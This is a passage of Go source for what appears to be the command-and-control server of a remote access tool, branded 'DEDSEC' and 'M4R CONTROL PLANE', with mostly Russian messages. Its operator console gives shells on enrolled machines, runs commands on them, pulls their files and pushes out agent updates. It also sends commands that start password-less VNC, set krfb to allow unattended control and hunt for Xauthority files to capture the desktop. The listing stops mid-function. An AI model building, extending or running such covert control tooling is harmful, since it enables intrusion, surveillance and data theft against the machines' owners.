package main

import (
	"bufio"
	"bytes"
	"fmt"
	"log"
	"net"
	"os"
	"path"
	"path/filepath"
	"sort"
	"strconv"
	"strings"
	"time"
)

type FileBrowseItem struct {
	Index    int
	Name     string
	IsDir    bool
	Size     int64
	FullPath string
	Perm     string
}

func cleanFilename(p string) string {
	p = strings.TrimSpace(p)
	if idx := strings.LastIndex(p, "\\"); idx >= 0 {
		p = p[idx+1:]
	}
	if idx := strings.LastIndex(p, "/"); idx >= 0 {
		p = p[idx+1:]
	}
	return p
}

// TCPOperatorConsole provides interactive netcat/terminal access on port 9000
type TCPOperatorConsole struct {
	listener  net.Listener
	nm        *NodeManager
	udpGw     *UDPGateway
	fileMgr   *FileManager
	updateMgr *UpdateManager
	cfg       *Config
	stats     *ServerStats
}

// NewTCPOperatorConsole initializes the console listener
func NewTCPOperatorConsole(addr string, nm *NodeManager, udpGw *UDPGateway, fileMgr *FileManager, updateMgr *UpdateManager, cfg *Config, stats *ServerStats) (*TCPOperatorConsole, error) {
	l, err := net.Listen("tcp", addr)
	if err != nil {
		return nil, err
	}

	return &TCPOperatorConsole{
		listener:  l,
		nm:        nm,
		udpGw:     udpGw,
		fileMgr:   fileMgr,
		updateMgr: updateMgr,
		cfg:       cfg,
		stats:     stats,
	}, nil
}

func (toc *TCPOperatorConsole) getClientHost(conn net.Conn) string {
	if tcpAddr, ok := conn.LocalAddr().(*net.TCPAddr); ok && !tcpAddr.IP.IsUnspecified() {
		return tcpAddr.IP.String()
	}
	return "127.0.0.1"
}

// Start begins accepting operator netcat connections
func (toc *TCPOperatorConsole) Start() {
	for {
		conn, err := toc.listener.Accept()
		if err != nil {
			log.Printf("[-] TCPOperatorConsole accept error: %v", err)
			return
		}
		go toc.handleClient(conn)
	}
}

func cleanOperatorInput(s string) string {
	var out []rune
	inEscape := false
	for _, r := range s {
		if r == 0x1B {
			inEscape = true
			continue
		}
		if inEscape {
			if (r >= 'a' && r <= 'z') || (r >= 'A' && r <= 'Z') || r == '~' {
				inEscape = false
			}
			continue
		}
		if r == 0x08 || r == 0x7F {
			if len(out) > 0 {
				out = out[:len(out)-1]
			}
			continue
		}
		if r < 0x20 && r != '\t' {
			continue
		}
		out = append(out, r)
	}
	return strings.TrimSpace(string(out))
}

func (toc *TCPOperatorConsole) handleClient(conn net.Conn) {
	defer conn.Close()

	reader := bufio.NewReader(conn)
	writer := bufio.NewWriter(conn)

	// Admin Password Check
	if toc.cfg != nil && toc.cfg.GetAdminPassword() != "" {
		pass := toc.cfg.GetAdminPassword()
		writer.WriteString("\r\n\x1b[1;37m+======================================================+\x1b[0m\r\n")
		writer.WriteString("\x1b[1;37m| // DEDSEC OPERATOR ACCESS // AUTHENTICATION REQUIRED |\x1b[0m\r\n")
		writer.WriteString("\x1b[1;37m+======================================================+\x1b[0m\r\n")
		writer.WriteString("\x1b[1;33m[!] Enter Admin Password: \x1b[0m")
		writer.Flush()

		inputPass, err := reader.ReadString('\n')
		if err != nil {
			return
		}
		cleanPass := cleanOperatorInput(inputPass)
		if cleanPass != pass && cleanPass != toc.cfg.AuthToken {
			writer.WriteString("\r\n\x1b[1;31m[-] Access Denied: Incorrect Password.\x1b[0m\r\n\r\n")
			writer.Flush()
			return
		}
		writer.WriteString("\r\n\x1b[1;32m[+] Access Granted. Initializing Operator Console...\x1b[0m\r\n\r\n")
		writer.Flush()
	}

	currentTab := 1
	var (
		fileSelectedNode *Node
		fileCurrentPath  string
		fileEntries      []FileBrowseItem
	)

	renderMenu := func() {
		if currentTab == 2 {
			if fileSelectedNode == nil {
				toc.printTabFilesNodePicker(writer)
			} else {
				toc.printTabFilesDirView(writer, fileSelectedNode, fileCurrentPath, fileEntries)
			}
		} else {
			toc.printMenu(writer, currentTab)
		}
	}

	// Initial render
	renderMenu()

	for {
		_ = conn.SetReadDeadline(time.Time{})
		line, err := reader.ReadString('\n')
		if err != nil {
			break
		}

		cmd := cleanOperatorInput(line)
		if cmd == "" {
			renderMenu()
			continue
		}

		if cmd == "q" || cmd == "quit" || cmd == "exit" {
			_, _ = writer.WriteString("Goodbye.\r\n")
			_ = writer.Flush()
			break
		}

		if cmd == "r" || cmd == "refresh" {
			if currentTab == 2 && fileSelectedNode != nil {
				fileEntries = toc.fetchDirectoryEntries(fileSelectedNode, fileCurrentPath)
			}
			renderMenu()
			continue
		}

		if cmd == "l" || cmd == "rescue" {
			toc.printRescueGuide(writer)
			renderMenu()
			continue
		}

		parts := strings.Fields(cmd)
		op := strings.ToLower(parts[0])

		// Tab switching commands
		if (op == "tab" && len(parts) >= 2) || op == "t1" || op == "t2" || op == "t3" || op == "t4" || op == "nodes" || op == "shells" || op == "vnc" || op == "desktop" || op == "tools" || op == "updater" {
			newTab := currentTab
			if op == "tab" {
				if t, err := strconv.Atoi(parts[1]); err == nil && t >= 1 && t <= 4 {
					newTab = t
				}
			} else if op == "t1" || op == "nodes" || op == "shells" {
				newTab = 1
			} else if op == "t2" {
				newTab = 2
			} else if op == "t3" || op == "vnc" || op == "desktop" {
				newTab = 3
			} else if op == "t4" || op == "tools" || op == "updater" {
				newTab = 4
			}
			currentTab = newTab
			renderMenu()
			continue
		}

		if (op == "files" || op == "file") && len(parts) == 1 {
			currentTab = 2
			renderMenu()
			continue
		}

		nodes := toc.nm.ListNodes()

		// Full Uninstaller Command
		if (op == "uninstall" || op == "purge" || op == "delete-node") && len(parts) >= 2 {
			target := toc.resolveNode(parts[1], nodes)
			if target != nil {
				toc.uninstallNode(writer, target, conn)
				if fileSelectedNode != nil && fileSelectedNode.ID == target.ID {
					fileSelectedNode = nil
					fileCurrentPath = ""
					fileEntries = nil
				}
				continue
			} else {
				writer.WriteString(fmt.Sprintf("\x1b[31m[-] Узел '%s' не найден\x1b[0m\r\n", parts[1]))
				writer.Flush()
				continue
			}
		}

		// TAB 2: INTERACTIVE FILE EXPLORER
		if currentTab == 2 {
			if op == "back" || op == "nodes" || op == "switch" || op == "picker" {
				fileSelectedNode = nil
				fileCurrentPath = ""
				fileEntries = nil
				renderMenu()
				continue
			}

			if fileSelectedNode == nil {
				target := toc.resolveNode(op, nodes)
				if target != nil {
					fileSelectedNode = target
					fileCurrentPath = toc.detectInitialPath(target)
					fileEntries = toc.fetchDirectoryEntries(target, fileCurrentPath)
					renderMenu()
					continue
				} else {
					writer.WriteString(fmt.Sprintf("\x1b[31m[-] Узел '%s' не найден. Введите номер или ID компьютера из списка.\x1b[0m\r\n\r\nm4r:files> ", op))
					writer.Flush()
					continue
				}
			} else {
				if op == ".." {
					parent := path.Dir(strings.TrimSuffix(fileCurrentPath, "/"))
					if parent == "" || parent == "." {
						parent = "/"
					}
					fileCurrentPath = parent
					fileEntries = toc.fetchDirectoryEntries(fileSelectedNode, fileCurrentPath)
					renderMenu()
					continue
				}

				if op == "cd" && len(parts) >= 2 {
					targetArg := parts[1]
					if targetArg == ".." {
						parent := path.Dir(strings.TrimSuffix(fileCurrentPath, "/"))
						if parent == "" || parent == "." {
							parent = "/"
						}
						fileCurrentPath = parent
					} else if strings.HasPrefix(targetArg, "/") {
						fileCurrentPath = path.Clean(targetArg)
					} else {
						fileCurrentPath = path.Clean(path.Join(fileCurrentPath, targetArg))
					}
					fileEntries = toc.fetchDirectoryEntries(fileSelectedNode, fileCurrentPath)
					renderMenu()
					continue
				}

				if (op == "pull" || op == "get" || op == "download") && len(parts) >= 2 {
					targetArg := parts[1]
					if strings.Contains(targetArg, ":\\") || strings.Contains(targetArg, ":/") || strings.Contains(targetArg, "\\") {
						base := cleanFilename(targetArg)
						writer.WriteString("\r\n\x1b[1;33m[!] Вы указали путь на локальном Windows-компьютере.\x1b[0m\r\n")
						writer.WriteString("    - Команда 'pull' СКАЧИВАЕТ файл с удалённого узла на сервер/ПК.\r\n")
						writer.WriteString("    - Чтобы ЗАГРУЗИТЬ файл с вашего ПК на этот узел:\r\n")
						writer.WriteString("      1. Откройте в браузере: \x1b[1;36mhttp://104.143.206.163:8080/upload\x1b[0m\r\n")
						writer.WriteString("      2. Перетащите файл и нажмите 'Загрузить'\r\n")
						writer.WriteString(fmt.Sprintf("      3. Затем в этой консоли введите: \x1b[1;32mpush %s\x1b[0m\r\n\r\n", base))
						writer.WriteString(fmt.Sprintf("m4r:files(%s)> ", fileCurrentPath))
						writer.Flush()
						continue
					}
					targetRemotePath := ""
					if num, err := strconv.Atoi(targetArg); err == nil && num >= 1 && num <= len(fileEntries) {
						targetRemotePath = fileEntries[num-1].FullPath
					} else {
						if strings.HasPrefix(targetArg, "/") {
							targetRemotePath = targetArg
						} else {
							targetRemotePath = path.Join(fileCurrentPath, targetArg)
						}
					}
					toc.downloadFileInteractive(writer, fileSelectedNode, targetRemotePath, conn)
					writer.WriteString(fmt.Sprintf("m4r:files(%s)> ", fileCurrentPath))
					writer.Flush()
					continue
				}

				if (op == "push" || op == "put" || op == "upload") && len(parts) >= 2 {
					localPath := parts[1]
					if strings.Contains(localPath, ":\\") || strings.Contains(localPath, ":/") || strings.Contains(localPath, "\\") {
						base := cleanFilename(localPath)
						writer.WriteString("\r\n\x1b[1;33m[!] Вы указали путь на локальном Windows-компьютере.\x1b[0m\r\n")
						writer.WriteString("    Netcat подключён к удалённому серверу и не имеет прямого доступа к диску C:\\ вашего ПК.\r\n")
						writer.WriteString("    Чтобы быстро отправить этот файл:\r\n")
						writer.WriteString("    1. Откройте в браузере: \x1b[1;36mhttp://104.143.206.163:8080/upload\x1b[0m\r\n")
						writer.WriteString("    2. Перетащите файл туда и нажмите 'Загрузить на сервер'\r\n")
						writer.WriteString(fmt.Sprintf("    3. Затем в этой консоли введите: \x1b[1;32mpush %s\x1b[0m\r\n\r\n", base))
						writer.WriteString(fmt.Sprintf("m4r:files(%s)> ", fileCurrentPath))
						writer.Flush()
						continue
					}
					toc.uploadFileInteractive(writer, fileSelectedNode, localPath, fileCurrentPath, conn)
					fileEntries = toc.fetchDirectoryEntries(fileSelectedNode, fileCurrentPath)
					renderMenu()
					continue
				}

				if num, err := strconv.Atoi(op); err == nil {
					if num >= 1 && num <= len(fileEntries) {
						item := fileEntries[num-1]
						if item.IsDir {
							if item.Name == ".." {
								parent := path.Dir(strings.TrimSuffix(fileCurrentPath, "/"))
								if parent == "" || parent == "." {
									parent = "/"
								}
								fileCurrentPath = parent
							} else {
								fileCurrentPath = item.FullPath
							}
							fileEntries = toc.fetchDirectoryEntries(fileSelectedNode, fileCurrentPath)
							renderMenu()
							continue
						} else {
							writer.WriteString(fmt.Sprintf("\r\n\x1b[1;33m[!] '%s' — это файл (%d байт).\x1b[0m\r\n", item.Name, item.Size))
							writer.WriteString(fmt.Sprintf("    Чтобы скачать его, введите: \x1b[1;32mpull %d\x1b[0m\r\n", num))
							writer.WriteString("    Или введите номер директории для перехода.\r\n\r\n")
							writer.WriteString(fmt.Sprintf("m4r:files(%s)> ", fileCurrentPath))
							writer.Flush()
							continue
						}
					} else {
						writer.WriteString(fmt.Sprintf("\x1b[31m[-] Номер вне диапазона (доступны 1-%d)\x1b[0m\r\n\r\nm4r:files(%s)> ", len(fileEntries), fileCurrentPath))
						writer.Flush()
						continue
					}
				}

				writer.WriteString(fmt.Sprintf("\x1b[33m[!] Неизвестная команда: %s (введите номер директории, 'pull <#>', 'push <файл>', '..' или 'back')\x1b[0m\r\n\r\nm4r:files(%s)> ", cmd, fileCurrentPath))
				writer.Flush()
				continue
			}
		}

		// TAB 1 / TAB 3 / TAB 4 COMMAND HANDLING:
		// Direct number OR 's <num> [user]' OR 'pty <num> [user]' -> attach terminal
		var targetNode *Node
		var targetUser string
		invalidTargetStr := ""

		if (op == "s" || op == "pty" || op == "session" || op == "shell") && len(parts) >= 2 {
			targetNode = toc.resolveNode(parts[1], nodes)
			if targetNode == nil {
				invalidTargetStr = parts[1]
			}
			if len(parts) >= 3 {
				targetUser = parts[2]
			}
		} else if currentTab == 1 {
			// On Tab 1, typing a number or node ID connects to that node with optional target user
			if _, err := strconv.Atoi(op); err == nil {
				targetNode = toc.resolveNode(op, nodes)
				if targetNode == nil {
					invalidTargetStr = op
				}
				if len(parts) >= 2 {
					targetUser = parts[1]
				}
			} else if _, ok := toc.nm.GetNode(op); ok {
				targetNode = toc.resolveNode(op, nodes)
				if len(parts) >= 2 {
					targetUser = parts[1]
				}
			}
		} else {
			// On other tabs, if single digit 1..4 is typed, switch to that tab
			if t, err := strconv.Atoi(op); err == nil {
				if t >= 1 && t <= 4 && len(parts) == 1 {
					currentTab = t
					renderMenu()
					continue
				} else {
					targetNode = toc.resolveNode(op, nodes)
					if targetNode == nil {
						invalidTargetStr = op
					}
					if len(parts) >= 2 {
						targetUser = parts[1]
					}
				}
			}
		}

		if targetNode != nil {
			if targetUser == "" {
				chosen := toc.selectTargetUser(writer, reader, targetNode)
				if chosen == "CANCEL" {
					renderMenu()
					continue
				}
				targetUser = chosen
			}
			toc.attachTerminal(conn, reader, writer, targetNode, targetUser)
			for reader.Buffered() > 0 {
				_, _ = reader.ReadByte()
			}
			renderMenu()
			continue
		} else if invalidTargetStr != "" {
			_, _ = writer.WriteString(fmt.Sprintf("\x1b[31m[-] Invalid node index %s (type 'r' to see available nodes)\x1b[0m\r\n", invalidTargetStr))
			_ = writer.Flush()
			continue
		}



		if op == "note" && len(parts) >= 3 {
			target := toc.resolveNode(parts[1], nodes)
			if target != nil {
				noteText := strings.Join(parts[2:], " ")
				toc.nm.SetNodeNote(target.ID, noteText)
				_, _ = writer.WriteString(fmt.Sprintf("\x1b[32m[+] Note updated for [%s]: %s\x1b[0m\r\n", target.ID, noteText))
				_ = writer.Flush()
				continue
			}
		}

		if op == "engine" && len(parts) >= 3 {
			target := toc.resolveNode(parts[1], nodes)
			if target != nil {
				engine := strings.ToLower(parts[2])
				toc.nm.SetNodeEngine(target.ID, engine)
				engineCmd := ""
				switch engine {
				case "krfb":
					engineCmd = "(which krfb >/dev/null && nohup krfb --nodialog >/dev/null 2>&1 &) || echo '[-] krfb not found on system'\n"
				case "x11vnc":
					engineCmd = "(which x11vnc >/dev/null && nohup x11vnc -display :0 -forever -shared -rfbport 5900 -nopw -bg >/dev/null 2>&1 &) || echo '[-] x11vnc not found on system'\n"
				case "custom":
					engineCmd = "pkill -f x11vnc 2>/dev/null; pkill -f krfb 2>/dev/null; echo '[+] Default C agent engine active'\n"
				}
				if engineCmd != "" {
					_ = toc.udpGw.SendPtyData(target, []byte(engineCmd))
				}
				_, _ = writer.WriteString(fmt.Sprintf("\x1b[32m[+] VNC Engine set to [%s] for %s\x1b[0m\r\n", engine, target.ID))
				_ = writer.Flush()
				continue
			}
		}

		if op == "debug" && len(parts) >= 2 {
			target := toc.resolveNode(parts[1], nodes)
			if target != nil {
				toc.printDebug(writer, target)
				continue
			}
		}

		if op == "update-all" {
			serverHost := toc.getClientHost(conn)
			writer.WriteString("\r\n\x1b[1;36m[*] Triggering mass upgrade on all connected agents...\x1b[0m\r\n")
			writer.Flush()
			results := toc.updateMgr.UpdateAll(serverHost)
			for id, res := range results {
				writer.WriteString(fmt.Sprintf("  - [%s]: %s\r\n", id, res))
			}
			writer.WriteString("\x1b[32m[+] Mass update routine complete.\x1b[0m\r\n\r\n")
			writer.WriteString("Press Enter to continue...")
			writer.Flush()
			continue
		}

		if op == "update" && len(parts) >= 2 {
			target := toc.resolveNode(parts[1], nodes)
			if target != nil {
				serverHost := toc.getClientHost(conn)
				writer.WriteString(fmt.Sprintf("\r\n\x1b[1;36m[*] Upgrading agent on [%s] (Slot #%d) ...\x1b[0m\r\n", target.ID, target.Slot))
				writer.Flush()
				res, err := toc.updateMgr.UpdateNode(target, serverHost)
				if err != nil {
					writer.WriteString(fmt.Sprintf("\x1b[31m[-] Update failed: %v (%s)\x1b[0m\r\n", err, res))
				} else {
					writer.WriteString(fmt.Sprintf("\x1b[32m[+] %s\x1b[0m\r\n", res))
				}
				writer.WriteString("\r\nPress Enter to continue...")
				writer.Flush()
				continue
			}
		}

		if (op == "get" || op == "download") && len(parts) >= 3 {
			target := toc.resolveNode(parts[1], nodes)
			if target != nil {
				remotePath := parts[2]
				toc.triggerDownload(writer, target, remotePath, conn)
				continue
			}
		}

		if (op == "put" || op == "upload") && len(parts) >= 3 {
			target := toc.resolveNode(parts[1], nodes)
			if target != nil {
				fileIDOrURL := parts[2]
				remotePath := ""
				if len(parts) >= 4 {
					remotePath = parts[3]
				}
				toc.triggerUpload(writer, target, fileIDOrURL, remotePath, conn)
				continue
			}
		}

		if (op == "fs" || op == "ls") && len(parts) >= 2 {
			target := toc.resolveNode(parts[1], nodes)
			if target != nil {
				dirPath := "/"
				if len(parts) >= 3 {
					dirPath = parts[2]
				}
				toc.browseFileSystem(writer, target, dirPath)
				continue
			}
		}

		if (op == "exec" || op == "cmd" || op == "x") && len(parts) >= 3 {
			target := toc.resolveNode(parts[1], nodes)
			if target != nil {
				userCmd := strings.Join(parts[2:], " ")
				toc.executeCommand(writer, target, userCmd)
				continue
			}
		}

		if op == "krfb" && len(parts) >= 2 {
			target := toc.resolveNode(parts[1], nodes)
			if target != nil {
				toc.installAndRunKrfb(writer, target)
				continue
			}
		}

		if op == "install" && len(parts) >= 3 {
			target := toc.resolveNode(parts[1], nodes)
			if target != nil {
				pkg := strings.ToLower(parts[2])
				if pkg == "krfb" {
					toc.installAndRunKrfb(writer, target)
					continue
				}
			}
		}

		if (op == "set" || op == "config") && len(parts) >= 4 {
			target := toc.resolveNode(parts[1], nodes)
			if target != nil {
				key := strings.ToLower(parts[2])
				val := strings.Join(parts[3:], " ")
				switch key {
				case "port":
					if p, err := strconv.Atoi(parts[3]); err == nil && p > 0 && p < 65536 {
						toc.nm.SetNodePort(target.ID, uint16(p))
						if target.VncEngine == "x11vnc" {
							cmd := fmt.Sprintf("pkill -f x11vnc 2>/dev/null; nohup x11vnc -display :0 -forever -shared -rfbport %d -nopw -bg >/dev/null 2>&1 &\n", p)
							_ = toc.udpGw.SendPtyData(target, []byte(cmd))
						}
						_, _ = writer.WriteString(fmt.Sprintf("\x1b[32m[+] VNC Port set to %d for %s\x1b[0m\r\n", p, target.ID))
					} else {
						_, _ = writer.WriteString("\x1b[31m[-] Invalid port number\x1b[0m\r\n")
					}
				case "note":
					toc.nm.SetNodeNote(target.ID, val)
					_, _ = writer.WriteString(fmt.Sprintf("\x1b[32m[+] Note updated for [%s]: %s\x1b[0m\r\n", target.ID, val))
				case "engine":
					engine := strings.ToLower(parts[3])
					toc.nm.SetNodeEngine(target.ID, engine)
					engineCmd := ""
					port := target.VncPort
					if port == 0 {
						port = 5900
					}
					switch engine {
					case "krfb":
						engineCmd = fmt.Sprintf("export DISPLAY=:0; XA=$(ls /tmp/xauth_* /run/sddm/xauth_* /run/user/*/gdm/Xauthority /home/*/.Xauthority /root/.Xauthority 2>/dev/null | head -n 1); [ -n \"$XA\" ] && export XAUTHORITY=\"$XA\"; if ! which krfb >/dev/null 2>&1; then (apt-get update -y && apt-get install -y krfb || dnf install -y krfb || pacman -S --noconfirm krfb || urpmi --auto krfb) 2>/dev/null || true; fi; pkill -9 -f krfb 2>/dev/null; mkdir -p ~/.config && printf '[General]\\npreferredFrameBufferPlugin=xcb\\n\\n[Security]\\nallowDesktopControl=true\\nallowUnattendedAccess=true\\nnoWallet=true\\n\\n[Network]\\nport=%d\\nuseDefaultPort=true\\npublishService=false\\n' > ~/.config/krfbrc; if which krfb >/dev/null 2>&1; then nohup krfb --nodialog >/tmp/krfb.log 2>&1 & echo '[+] krfb started on port %d'; else echo '[-] krfb not found and could not be installed'; fi\n", port, port)
					case "x11vnc":
						engineCmd = fmt.Sprintf("(which x11vnc >/dev/null && nohup x11vnc -display :0 -forever -shared -rfbport %d -nopw -bg >/dev/null 2>&1 &) || echo '[-] x11vnc not found on system'\n", port)
					case "custom":
						engineCmd = "pkill -f x11vnc 2>/dev/null; pkill -f krfb 2>/dev/null; echo '[+] Default C agent engine active'\n"
					}
					if engineCmd != "" {
						_ = toc.udpGw.SendPtyData(target, []byte(engineCmd))
					}
					_, _ = writer.WriteString(fmt.Sprintf("\x1b[32m[+] VNC Engine set to [%s] for %s\x1b[0m\r\n", engine, target.ID))
				case "scale":
					val := strings.ToLower(parts[3])
					scale := 0
					if s, err := strconv.Atoi(val); err == nil && s >= 0 && s <= 8 {
						scale = s
					}
					toc.nm.SetNodeVncScale(target.ID, scale)
					_, _ = writer.WriteString(fmt.Sprintf("\x1b[32m[+] VNC Scale set to %dx for %s\x1b[0m\r\n", scale, target.ID))
				case "bpp", "palette", "color":
					val := parts[3]
					if b, err := strconv.Atoi(val); err == nil && (b == 8 || b == 16 || b == 32) {
						toc.nm.SetNodeVncBpp(target.ID, b)
						_, _ = writer.WriteString(fmt.Sprintf("\x1b[32m[+] VNC BPP set to %d for %s\x1b[0m\r\n", b, target.ID))
					} else {
						_, _ = writer.WriteString("\x1b[31m[-] Invalid BPP (use 8, 16, or 32)\x1b[0m\r\n")
					}
				case "quality":
					p := strings.ToLower(parts[3])
					if p == "fast" {
						toc.nm.SetNodeVncQuality(target.ID, 2, 8)
					} else if p == "best" {
						toc.nm.SetNodeVncQuality(target.ID, 1, 32)
					} else {
						toc.nm.SetNodeVncQuality(target.ID, 2, 16)
					}
					_, _ = writer.WriteString(fmt.Sprintf("\x1b[32m[+] VNC Quality preset [%s] applied to %s\x1b[0m\r\n", p, target.ID))
				}
				_ = writer.Flush()
				continue
			}
		}

		if (op == "scale" || op == "vnc-scale") && len(parts) >= 3 {
			target := toc.resolveNode(parts[1], nodes)
			if target != nil {
				val := strings.ToLower(parts[2])
				scale := 0
				switch val {
				case "auto", "0", "def", "default":
					scale = 0
				case "1", "1x", "native", "full":
					scale = 1
				case "2", "2x", "half", "hd":
					scale = 2
				case "3", "3x", "third", "720p":
					scale = 3
				case "4", "4x", "quarter", "low":
					scale = 4
				default:
					if s, err := strconv.Atoi(val); err == nil && s >= 1 && s <= 8 {
						scale = s
					} else {
						_, _ = writer.WriteString("\x1b[31m[-] Invalid scale value. Use 1 (native), 2 (half), 3, 4, or auto\x1b[0m\r\n")
						_ = writer.Flush()
						continue
					}
				}
				toc.nm.SetNodeVncScale(target.ID, scale)
				scaleStr := fmt.Sprintf("%dx downscale", scale)
				if scale == 0 {
					scaleStr = "auto downscale"
				} else if scale == 1 {
					scaleStr = "1x (native, no downscale)"
				}
				_, _ = writer.WriteString(fmt.Sprintf("\x1b[32m[+] VNC Resolution Scale set to [%s] for [%s]\x1b[0m\r\n", scaleStr, target.ID))
				_ = writer.Flush()
				continue
			} else {
				_, _ = writer.WriteString(fmt.Sprintf("\x1b[31m[-] Node '%s' not found\x1b[0m\r\n", parts[1]))
				_ = writer.Flush()
				continue
			}
		}

		if (op == "bpp" || op == "vnc-bpp" || op == "palette" || op == "color") && len(parts) >= 3 {
			target := toc.resolveNode(parts[1], nodes)
			if target != nil {
				val := strings.ToLower(parts[2])
				bpp := 16
				switch val {
				case "8", "8bpp", "palette", "256", "fast":
					bpp = 8
				case "16", "16bpp", "565", "medium", "balanced":
					bpp = 16
				case "32", "32bpp", "888", "true", "best", "full":
					bpp = 32
				default:
					if b, err := strconv.Atoi(val); err == nil && (b == 8 || b == 16 || b == 32) {
						bpp = b
					} else {
						_, _ = writer.WriteString("\x1b[31m[-] Invalid BPP value. Use 8 (256-color palette), 16 (RGB565), or 32 (TrueColor)\x1b[0m\r\n")
						_ = writer.Flush()
						continue
					}
				}
				toc.nm.SetNodeVncBpp(target.ID, bpp)
				bppStr := fmt.Sprintf("%d bpp", bpp)
				if bpp == 8 {
					bppStr = "8 bpp (RGB332 palette / 256 colors - maximum compression)"
				} else if bpp == 16 {
					bppStr = "16 bpp (RGB565 - balanced speed & quality)"
				} else if bpp == 32 {
					bppStr = "32 bpp (RGB888 - TrueColor full quality)"
				}
				_, _ = writer.WriteString(fmt.Sprintf("\x1b[32m[+] VNC Color Transmission set to [%s] for [%s]\x1b[0m\r\n", bppStr, target.ID))
				_ = writer.Flush()
				continue
			} else {
				_, _ = writer.WriteString(fmt.Sprintf("\x1b[31m[-] Node '%s' not found\x1b[0m\r\n", parts[1]))
				_ = writer.Flush()
				continue
			}
		}

		if (op == "quality" || op == "q" || op == "vnc-quality") && len(parts) >= 3 {
			target := toc.resolveNode(parts[1], nodes)
			if target != nil {
				p2 := strings.ToLower(parts[2])
				scale := 0
				bpp := 16
				if p2 == "fast" || p2 == "turbo" || p2 == "speed" {
					scale = 2
					bpp = 8
				} else if p2 == "balanced" || p2 == "normal" {
					scale = 2
					bpp = 16
				} else if p2 == "best" || p2 == "high" || p2 == "hq" {
					scale = 1
					bpp = 32
				} else if p2 == "low" || p2 == "min" {
					scale = 4
					bpp = 8
				} else {
					if s, err := strconv.Atoi(p2); err == nil && s >= 1 && s <= 8 {
						scale = s
					}
					if len(parts) >= 4 {
						if b, err := strconv.Atoi(parts[3]); err == nil && (b == 8 || b == 16 || b == 32) {
							bpp = b
						}
					}
				}
				toc.nm.SetNodeVncQuality(target.ID, scale, bpp)
				_, _ = writer.WriteString(fmt.Sprintf("\x1b[32m[+] VNC Quality for [%s] updated: Scale=%dx, BPP=%d\x1b[0m\r\n", target.ID, scale, bpp))
				_ = writer.Flush()
				continue
			} else {
				_, _ = writer.WriteString(fmt.Sprintf("\x1b[31m[-] Node '%s' not found\x1b[0m\r\n", parts[1]))
				_ = writer.Flush()
				continue
			}
		}

		if op == "port" && len(parts) >= 3 {
			target := toc.resolveNode(parts[1], nodes)
			if target != nil {
				if p, err := strconv.Atoi(parts[2]); err == nil && p > 0 && p < 65536 {
					toc.nm.SetNodePort(target.ID, uint16(p))
					if target.VncEngine == "x11vnc" {
						cmd := fmt.Sprintf("pkill -f x11vnc 2>/dev/null; nohup x11vnc -display :0 -forever -shared -rfbport %d -nopw -bg >/dev/null 2>&1 &\n", p)
						_ = toc.udpGw.SendPtyData(target, []byte(cmd))
					}
					_, _ = writer.WriteString(fmt.Sprintf("\x1b[32m[+] VNC Port set to %d for %s\x1b[0m\r\n", p, target.ID))
					_ = writer.Flush()
					continue
				}
			}
		}

		if op == "files" {
			toc.printFiles(writer)
			continue
		}

		if op == "v" && len(parts) >= 2 {
			target := toc.resolveNode(parts[1], nodes)
			if target != nil {
				toc.printVncInfo(writer, target)
				continue
			}
		}

		_, _ = writer.WriteString(fmt.Sprintf("\x1b[33m[!] Unknown command: %s (type 'r' to refresh)\x1b[0m\r\n", cmd))
		_ = writer.Flush()
	}
}

// resolveNode finds a target node by ID, Slot number, or 1-based index in the nodes slice
func (toc *TCPOperatorConsole) resolveNode(arg string, nodes []*Node) *Node {
	arg = strings.TrimSpace(arg)
	arg = strings.TrimPrefix(arg, "#")
	if arg == "" {
		return nil
	}
	// 1. Direct Node ID match
	if node, ok := toc.nm.GetNode(arg); ok {
		return node
	}
	// 2. Numeric lookup: Slot number first, then 1-based index
	if num, err := strconv.Atoi(arg); err == nil {
		if node := toc.nm.GetNodeBySlot(num); node != nil {
			return node
		}
		if num >= 1 && num <= len(nodes) {
			return nodes[num-1]
		}
	}
	return nil
}

func (toc *TCPOperatorConsole) printMenu(w *bufio.Writer, activeTab int) {
	toc.printHeader(w, activeTab)
	switch activeTab {
	case 1:
		toc.printTabNodes(w)
	case 2:
		toc.printTabFiles(w)
	case 3:
		toc.printTabVNC(w)
	case 4:
		toc.printTabTools(w)
	default:
		toc.printTabNodes(w)
	}
	_ = w.Flush()
}

func (toc *TCPOperatorConsole) printHeader(w *bufio.Writer, activeTab int) {
	timeout := time.Duration(toc.cfg.NodeOnlineTimeoutSec) * time.Second
	nodes := toc.nm.ListSummaries(timeout)
	onlineCount := 0
	for _, n := range nodes {
		if n.IsOnline {
			onlineCount++
		}
	}

	w.WriteString("\r\n\x1b[1;36m================================================================================\r\n")
	w.WriteString(fmt.Sprintf("  M4R CONTROL PLANE // Nodes Online: %d/%d | Server Uptime: %ds\r\n",
		onlineCount, len(nodes), int(time.Since(toc.stats.StartTime).Seconds())))
	w.WriteString("================================================================================\x1b[0m\r\n")

	t1 := " [1] NODES & SHELL "
	t2 := " [2] FILES "
	t3 := " [3] VNC DESKTOPS "
	t4 := " [4] TOOLS & UPDATER "

	switch activeTab {
	case 1:
		t1 = "\x1b[1;30;46m [1] NODES & SHELL \x1b[0m"
	case 2:
		t2 = "\x1b[1;30;46m [2] FILES \x1b[0m"
	case 3:
		t3 = "\x1b[1;30;46m [3] VNC DESKTOPS \x1b[0m"
	case 4:
		t4 = "\x1b[1;30;46m [4] TOOLS & UPDATER \x1b[0m"
	}

	w.WriteString(fmt.Sprintf(" %s | %s | %s | %s\r\n", t1, t2, t3, t4))
	w.WriteString("\x1b[1;36m--------------------------------------------------------------------------------\x1b[0m\r\n\r\n")
}

func (toc *TCPOperatorConsole) getPublicIP() string {
	return "104.143.206.163"
}

func (toc *TCPOperatorConsole) printTabNodes(w *bufio.Writer) {
	timeout := time.Duration(toc.cfg.NodeOnlineTimeoutSec) * time.Second
	nodes := toc.nm.ListSummaries(timeout)
	vpsIP := toc.getPublicIP()

	if len(nodes) == 0 {
		w.WriteString("  \x1b[33mNo registered nodes yet. Deploy mar4uder_agent on client machines.\x1b[0m\r\n\r\n")
	} else {
		w.WriteString("  \x1b[1m#   NODE ID           ПРАВА   STATUS      PTY CONNECT (SHELL)          VNC CONNECT (DESKTOP)        LABEL\x1b[0m\r\n")
		w.WriteString("  ----------------------------------------------------------------------------------------------------------\r\n")
		for _, n := range nodes {
			status := "\x1b[1;32mONLINE \x1b[0m"
			if !n.IsOnline {
				if n.LastSeenAgoSec > 86400*7 || n.LastSeenAgoSec < 0 {
					status = "\x1b[31mOFFLINE\x1b[0m"
				} else {
					status = fmt.Sprintf("\x1b[31mOFF (%2ds)\x1b[0m", n.LastSeenAgoSec)
				}
